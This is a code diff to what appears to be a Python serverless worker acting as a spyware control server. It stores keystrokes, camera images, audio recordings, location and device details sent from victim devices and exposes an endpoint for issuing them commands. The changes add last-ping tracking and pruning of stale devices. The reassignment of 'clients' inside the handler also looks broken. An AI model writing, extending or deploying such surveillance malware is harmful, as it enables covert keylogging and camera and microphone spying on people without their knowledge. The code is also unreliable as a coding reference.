@@ -2,6 +2,7 @@ from workers import WorkerEntrypoint, Response
 from pathlib import Path
 from urllib.parse import urlparse
 import json
+import time
 
 clients = {}
 
@@ -29,7 +30,9 @@ class Default(WorkerEntrypoint):
             try:
                 data = await request.json()
                 client_id = data.get("id", "unknown_device")
+                now = time.time()
                 
+                # ক্যামেরা বা অডিও ডেটা হ্যান্ডল
                 if "camera_image" in data or "audio_data" in data:
                     if client_id in clients:
                         if "camera_image" in data:
@@ -39,11 +42,14 @@ class Default(WorkerEntrypoint):
                             clients[client_id]["audio_data"] = data["audio_data"]
                             clients[client_id]["audio_time"] = data.get("time", "")
                         clients[client_id]["command"] = None
+                        clients[client_id]["lastPing"] = now
                 elif "keystrokes" in data:
                     if client_id not in clients:
                         clients[client_id] = {}
                     clients[client_id]["keystrokes"] = data["keystrokes"]
+                    clients[client_id]["lastPing"] = now
                 else:
+                    # সাধারণ লোকেশন ডেটা
                     if client_id not in clients:
                         clients[client_id] = {}
                     clients[client_id].update({
@@ -55,13 +61,18 @@ class Default(WorkerEntrypoint):
                         "browser": data.get("browser", "Unknown"),
                         "battery": data.get("battery", "N/A"),
                         "charging": data.get("charging", "N/A"),
-                        "lastSeen": data.get("time", "")
+                        "lastSeen": data.get("time", ""),
+                        "lastPing": now
                     })
                 return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
         if path == "/api/clients" and request.method == "GET":
+            now = time.time()
+            # ১০ মিনিট (৬০০ সেকেন্ড) এর বেশি পুরনো ডিভাইস রিমুভ করা
+            active_clients = {k: v for k, v in clients.items() if now - v.get("lastPing", now) < 600}
+            clients = active_clients
             return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
 
         if path == "/api/command" and request.method == "POST":
